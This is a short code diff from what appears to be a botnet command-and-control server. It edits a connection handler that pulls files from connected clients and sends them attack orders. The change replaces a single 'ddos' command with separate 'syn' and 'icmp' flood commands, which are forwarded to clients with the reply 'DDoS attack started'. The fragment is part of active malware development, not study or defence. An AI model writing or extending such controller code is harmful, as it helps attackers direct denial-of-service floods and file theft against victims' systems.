@@ -87,7 +87,7 @@ def handle_connection(client_socket, client_address, thread_uuid):
                 f.write(response)
             response = f"Downloaded {filename} to downloads/{filename}"
 
-        elif command.split(" ")[0] == "ddos":
+        elif command.split(" ")[0] == "syn" or command.split(" ")[0] == "icmp":
             client_socket.send(command.encode())
             response = "DDoS attack started"
         else:
